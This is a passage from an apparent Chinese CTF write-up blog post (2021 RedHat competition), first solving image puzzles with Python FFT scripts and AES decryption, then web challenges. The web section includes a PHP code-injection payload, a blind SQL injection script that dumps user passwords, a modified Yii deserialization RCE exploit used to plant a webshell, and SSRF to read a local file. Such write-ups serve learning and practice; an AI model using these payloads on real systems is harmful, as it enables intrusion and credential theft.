+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> cv2
+<span class="token keyword">import</span> struct
+<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
+<span class="token keyword">from</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">import</span> plot<span class="token punctuation">,</span> show
+
+
+<span class="token keyword">def</span> <span class="token function">unmapping</span><span class="token punctuation">(</span>data_min<span class="token punctuation">,</span> data_max<span class="token punctuation">,</span> data<span class="token punctuation">,</span> down<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> up<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span> tp<span class="token operator">=</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    interval <span class="token operator">=</span> data_max <span class="token operator">-</span> data_min
+    new_interval <span class="token operator">=</span> up <span class="token operator">-</span> down
+    new_data <span class="token operator">=</span> <span class="token punctuation">(</span>data<span class="token operator">-</span>down<span class="token punctuation">)</span> <span class="token operator">*</span> interval <span class="token operator">/</span> new_interval <span class="token operator">+</span> data_min
+    <span class="token comment"># new_data = (data - data_min) * new_interval / interval + down</span>
+    <span class="token comment"># new_data = new_data.astype(tp)</span>
+    <span class="token keyword">return</span> new_data
+
+
+<span class="token keyword">def</span> <span class="token function">fft</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img<span class="token punctuation">)</span>
+    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fftshift<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>
+    m <span class="token operator">=</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>fft<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p <span class="token operator">=</span> np<span class="token punctuation">.</span>angle<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> m<span class="token punctuation">,</span> p
+
+
+<span class="token keyword">def</span> <span class="token function">ifft</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    x <span class="token operator">=</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token number">1j</span><span class="token operator">*</span>p<span class="token punctuation">)</span>
+    y <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifftshift<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+    img <span class="token operator">=</span> np<span class="token punctuation">.</span>real<span class="token punctuation">(</span>np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifft2<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    img <span class="token operator">=</span> img<span class="token punctuation">.</span>astype<span class="token punctuation">(</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span>
+    <span class="token comment"># print(img)</span>
+    <span class="token keyword">return</span> img
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    <span class="token comment"># os.mkdir('m')</span>
+    <span class="token comment"># os.mkdir('p')</span>
+    <span class="token comment"># os.mkdir('frame')</span>
+    <span class="token comment"># os.system('ffmpeg -i 1.mkv m/%03d.png')</span>
+    <span class="token comment"># os.system('ffmpeg -i 2.mkv p/%03d.png')</span>
+
+    r_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
+    s <span class="token operator">=</span> r_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    r_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+    m_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        x <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'!ff'</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token comment"># print(x)</span>
+        <span class="token comment"># min, max</span>
+        m_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+
+    files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> idx<span class="token punctuation">,</span> <span class="token builtin">file</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        m_img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'm/</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>IMREAD_GRAYSCALE<span class="token punctuation">)</span>
+        p_img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'p/</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>IMREAD_GRAYSCALE<span class="token punctuation">)</span>
+
+        m_min<span class="token punctuation">,</span> m_max <span class="token operator">=</span> m_data<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>
+        m <span class="token operator">=</span> unmapping<span class="token punctuation">(</span>m_min<span class="token punctuation">,</span> m_max<span class="token punctuation">,</span> m_img<span class="token punctuation">)</span>
+        p <span class="token operator">=</span> unmapping<span class="token punctuation">(</span><span class="token operator">-</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> p_img<span class="token punctuation">)</span>
+
+        img_raw <span class="token operator">=</span> ifft<span class="token punctuation">(</span>m<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
+        <span class="token comment"># plot(img_raw)</span>
+        <span class="token comment"># show()</span>
+        cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'frame/</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> img_raw<span class="token punctuation">)</span></code></pre>
+<p>在还原后的视频的最后，得到压缩包的解压密码 <code>zs6hmdlq5ohav5l1</code></p>
+<p><img src="/2021/05/24/CTF_2021RedHat/200.png"></p>
+<h4 id="challenge-2"><a href="#challenge-2" class="headerlink" title="challenge 2"></a>challenge 2</h4><p><code>hint.txt</code> 是个 MathML</p>
+<pre class="language-none"><code class="language-none">&lt;math&gt;&lt;mrow&gt;&lt;mo&gt;{&lt;/mo&gt;&lt;mtable&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;⁡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;⁡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;/mtable&gt;&lt;mo&gt;&lt;/mo&gt;&lt;/mrow&gt;&lt;mo&gt;⟶&lt;/mo&gt;&lt;mrow&gt;&lt;mo&gt;{&lt;/mo&gt;&lt;mtable&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;⁡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;mtr&gt;&lt;mtd&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;cos&lt;/mi&gt;&lt;mo&gt;⁡&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mtd&gt;&lt;/mtr&gt;&lt;/mtable&gt;&lt;mo&gt;&lt;/mo&gt;&lt;/mrow&gt;&lt;math&gt;</code></pre>
+<p>也就是 </p>
+<p><img src="/2021/05/24/CTF_2021RedHat/image-20210525002117213.png"></p>
+<p>意思是幅值不变，而相位相互交换。</p>
+<p>另外给了两张图</p>
+<p><img src="/2021/05/24/CTF_2021RedHat/mix1.png" alt="mix1"></p>
+<p><img src="/2021/05/24/CTF_2021RedHat/mix2.png" alt="mix2"></p>
+<p>第二张明显有个二维码，脚本整一个！</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
+MiaoTony
+"""</span>
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> cv2
+<span class="token keyword">import</span> struct
+<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
+<span class="token keyword">from</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">import</span> plot<span class="token punctuation">,</span> show
+
+
+<span class="token keyword">def</span> <span class="token function">fft</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img<span class="token punctuation">)</span>
+    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fftshift<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>
+    m <span class="token operator">=</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>fft<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p <span class="token operator">=</span> np<span class="token punctuation">.</span>angle<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> m<span class="token punctuation">,</span> p
+
+
+<span class="token keyword">def</span> <span class="token function">ifft</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    x <span class="token operator">=</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token number">1j</span><span class="token operator">*</span>p<span class="token punctuation">)</span>
+    y <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifftshift<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+    img <span class="token operator">=</span> np<span class="token punctuation">.</span>real<span class="token punctuation">(</span>np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifft2<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    img <span class="token operator">=</span> img<span class="token punctuation">.</span>astype<span class="token punctuation">(</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span>
+    <span class="token comment"># print(img)</span>
+    <span class="token keyword">return</span> img
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    img1 <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'mix1.png'</span></span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>IMREAD_GRAYSCALE<span class="token punctuation">)</span>
+    img2 <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'mix2.png'</span></span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>IMREAD_GRAYSCALE<span class="token punctuation">)</span>
+
+    m1<span class="token punctuation">,</span> p1 <span class="token operator">=</span> fft<span class="token punctuation">(</span>img1<span class="token punctuation">)</span>
+    m2<span class="token punctuation">,</span> p2 <span class="token operator">=</span> fft<span class="token punctuation">(</span>img2<span class="token punctuation">)</span>
+    new_img1 <span class="token operator">=</span> ifft<span class="token punctuation">(</span>m1<span class="token punctuation">,</span> p2<span class="token punctuation">)</span>
+    new_img2 <span class="token operator">=</span> ifft<span class="token punctuation">(</span>m2<span class="token punctuation">,</span> p1<span class="token punctuation">)</span>
+
+    cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string">'new1.png'</span><span class="token punctuation">,</span> new_img1<span class="token punctuation">)</span>
+    cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string">'new2.png'</span><span class="token punctuation">,</span> new_img2<span class="token punctuation">)</span></code></pre>
+<p>其中一张里面就看出二维码了。</p>
+<p><img src="/2021/05/24/CTF_2021RedHat/new1.png" alt="new1"></p>
+<p>再稍微调一下图像的曲线。</p>
+<p><img src="/2021/05/24/CTF_2021RedHat/new1-1.png"></p>
+<p>扫码得到</p>
+<pre class="language-none"><code class="language-none">0f88b8529ab6c0dd2b5ceefaa1c5151aa207da114831b371ddcafc74cf8701c1d3318468d50e4b1725179d1bc04b251f</code></pre>
+<blockquote>
+<p>唔，IFFT 那步应该取模值而不是直接取实部，也就是改成</p>
+<pre class="language-python" data-language="python"><code class="language-python">img <span class="token operator">=</span> np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifft2<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+
+<p>这样得到的图片就不会丢失虚部的信息了。</p>
+<p><img src="/2021/05/24/CTF_2021RedHat/new11.png"></p>
+</blockquote>
+<h4 id="final-challenge"><a href="#final-challenge" class="headerlink" title="final challenge"></a>final challenge</h4><p><img src="/2021/05/24/CTF_2021RedHat/phase.png" alt="phase"></p>
+<p>根据文件名称，盲猜是相位上有猫腻。</p>
+<p>首先将幅值调整到 -pi 到 pi 之间，当作相位，作傅里叶反变换，最后再归一化到 0 到 255 之间，画出图像。</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span> cv2
+<span class="token keyword">import</span> struct
+<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
+<span class="token keyword">from</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">import</span> plot<span class="token punctuation">,</span> show
+
+
+<span class="token keyword">def</span> <span class="token function">mapping</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> down<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> up<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span> tp<span class="token operator">=</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data_max <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    data_min <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    interval <span class="token operator">=</span> data_max <span class="token operator">-</span> data_min
+    new_interval <span class="token operator">=</span> up <span class="token operator">-</span> down
+    new_data <span class="token operator">=</span> <span class="token punctuation">(</span>data <span class="token operator">-</span> data_min<span class="token punctuation">)</span> <span class="token operator">*</span> new_interval <span class="token operator">/</span> interval <span class="token operator">+</span> down
+    new_data <span class="token operator">=</span> new_data<span class="token punctuation">.</span>astype<span class="token punctuation">(</span>tp<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> new_data
+
+
+<span class="token keyword">def</span> <span class="token function">fft</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img<span class="token punctuation">)</span>
+    fft <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fftshift<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>
+    m <span class="token operator">=</span> np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>fft<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p <span class="token operator">=</span> np<span class="token punctuation">.</span>angle<span class="token punctuation">(</span>fft<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> m<span class="token punctuation">,</span> p
+
+
+<span class="token keyword">def</span> <span class="token function">ifft</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    x <span class="token operator">=</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token number">1j</span><span class="token operator">*</span>p<span class="token punctuation">)</span>
+    y <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifftshift<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+    img <span class="token operator">=</span> np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>ifft2<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> img
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'phase.png'</span></span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>IMREAD_GRAYSCALE<span class="token punctuation">)</span>
+    <span class="token comment"># print(img.max(), img.min())</span>
+
+    p <span class="token operator">=</span> mapping<span class="token punctuation">(</span>img<span class="token punctuation">,</span> <span class="token operator">-</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> tp<span class="token operator">=</span>np<span class="token punctuation">.</span>float64<span class="token punctuation">)</span>
+    img_raw <span class="token operator">=</span> ifft<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+    img2 <span class="token operator">=</span> mapping<span class="token punctuation">(</span>img_raw<span class="token punctuation">)</span>
+    cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string">'final.png'</span><span class="token punctuation">,</span> img2<span class="token punctuation">)</span>
+</code></pre>
+<p><img src="/2021/05/24/CTF_2021RedHat/final.png" alt="final"></p>
+<p>得到 <code>AESKEY: a8bms0v4qer3wgd67ofjhyxku5pi1czl</code></p>
+<p>而后用 AES ECB 模式解密</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
+
+key <span class="token operator">=</span> <span class="token string">"a8bms0v4qer3wgd67ofjhyxku5pi1czl"</span>
+aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>
+cipher <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>
+    <span class="token string">"0f88b8529ab6c0dd2b5ceefaa1c5151aa207da114831b371ddcafc74cf8701c1d3318468d50e4b1725179d1bc04b251f"</span><span class="token punctuation">)</span>
+flag <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+<span class="token comment"># b'flag{1ba48c8b-4eca-46aa-8216-d164538af310}\x06\x06\x06\x06\x06\x06'</span></code></pre>
+<p><code>flag{1ba48c8b-4eca-46aa-8216-d164538af310}</code></p>
+<blockquote>
+<p>草，果然是 CV 带师，把傅里叶变换各种折腾，喵喵是 fw，咱自己爬（（</p>
+</blockquote>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p><code>robots.txt</code> 泄露，访问 <code>1ndexx.php</code> 报500，后打开 <code>.1ndexx.php.swp</code> 拿到源码，phpinfo 页面拿到 flag</p>
+<pre class="language-none"><code class="language-none">code=&lt;?php phpinfo();?&gt;</code></pre>
+
+
+<h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p><code>www.zip</code> 拿到源码</p>
+<p>yii 反序列化漏洞 RCE CVE-2020-15148</p>
+<p><a target="_blank" rel="noopener" href="https://ca01h.top/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/#%E7%BC%96%E5%86%99EXP">https://ca01h.top/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/#%E7%BC%96%E5%86%99EXP</a></p>
+<p>魔改 exp <code>file_put_contents</code> 上传马，然后蚁剑连上后绕过 disable_function，拿到 flag</p>
+<h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p><code>image.php?id=</code> 存在注入</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+passwd <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        url <span class="token operator">=</span> <span class="token string">'http://eci-2zeir5o8p6vh97bek411.cloudeci1.ichunqiu.com/image.php?id=if(ascii(substr((select/**/group_concat(password)/**/from/**/users),{},1))={},1,0)'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
+            i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            passwd <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span>
+            <span class="token keyword">continue</span>
+
+<span class="token comment"># e845b14ae11ff886a2f72</span></code></pre>
+<p><code>admin</code> / <code>e845b14ae11ff886a2f72</code> 登录</p>
+<p>而后 SSRF <code>file:///flag</code> 拿到 flag</p>
+<p><img src="/2021/05/24/CTF_2021RedHat/upload_7eec12741899fd163833b3f3d7db7fad.png"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>喵喵好菜啊，喵呜呜。</p>
+<p>写论文好烦啊，太难受啦！</p>
+<p>还是摸鱼舒服。</p>
+<p>（溜了溜了</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://miaotony.xyz/2021/05/24/CTF_2021RedHat/">https://miaotony.xyz/2021/05/24/CTF_2021RedHat/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/WriteUp/">
+                                    <span class="chip bg-color">WriteUp</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
